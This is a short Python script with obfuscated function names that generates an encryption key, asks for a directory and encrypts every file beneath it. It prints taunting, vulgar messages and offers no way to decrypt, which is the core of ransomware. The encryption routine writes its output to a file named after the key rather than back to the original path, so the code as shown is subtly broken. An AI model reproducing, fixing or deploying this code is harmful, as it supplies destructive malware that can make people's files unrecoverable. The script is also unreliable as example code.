from cryptography.fernet import Fernet
import os

def AHA1():
    aha1 = Fernet.generate_key()
    with open("aha1.key", "wb") as aha2:
        aha2.write(aha1)
    return aha1

def AHA2():
    with open("aha1.key", "rb") as aha2:
        return aha2.read()

def AHA3(aha1, aha2):
    fernet = Fernet(aha2)
    with open(aha1, "rb") as aha3:
        aha4 = aha3.read()
    aha5 = fernet.encrypt(aha4)
    with open(aha2, "wb") as aha6:
        aha6.write(aha5)

def AHA4(aha6, aha7):
    for aha1, aha2, aha3 in os.walk(aha6):
        for aha4 in aha3:
            aha5 = os.path.join(aha1, aha4)
            try:
                AHA3(aha5, aha7)
            except Exception as e:
                print(f"suck me dry xD")

if __name__ == "__main__":
    aha1 = input("huh? ")
    aha2 = AHA1()
    AHA4(aha1, aha2)
    print("Ai luat-o in gura >~<")
